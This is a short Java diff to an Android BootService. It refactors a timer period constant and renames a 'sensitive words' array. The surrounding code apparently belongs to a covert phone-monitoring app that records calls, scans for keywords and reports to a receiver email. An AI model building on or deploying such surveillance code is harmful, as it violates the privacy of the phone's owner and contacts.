@@ -52,7 +52,6 @@ public class BootService extends Service
 	private Timer mGetInfoTimer = null;
 	private GetInfoTask mInfoTask = null;
 	private final long mGetInfoDelay  = 60000; // 60 Seconds
-	private final long mGetInfoPeriod = 300000; // 300 Seconds
 	
 	private TelephonyManager telManager = null;
 	private boolean recordStarted = false;
@@ -224,7 +223,7 @@ public class BootService extends Service
 		String recvMail = GlobalPrefActivity.getReceiverMail(context);
 		if (recvMail.length() > 0) 
 		{
-			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
+			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, GlobalValues.getInfoTimerPeriod);
 			
 			if (telManager == null) {
 				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
@@ -251,8 +250,8 @@ public class BootService extends Service
 		if (GlobalValues.recipients == null || GlobalValues.recipients.length <= 0) 
 			GlobalValues.recipients = getRecipients(context);
 		
-		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
-			GlobalValues.sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
+		if (GlobalValues.sensitiveWords == null || GlobalValues.sensitiveWords.length <= 0) 
+			GlobalValues.sensitiveWords = GlobalPrefActivity.getSensitiveWordsArray(context);
 		
 		if (GlobalValues.callRecordFilePrefix == null) 
 			GlobalValues.callRecordFilePrefix = context.getResources().getString(R.string.phonecall_record);
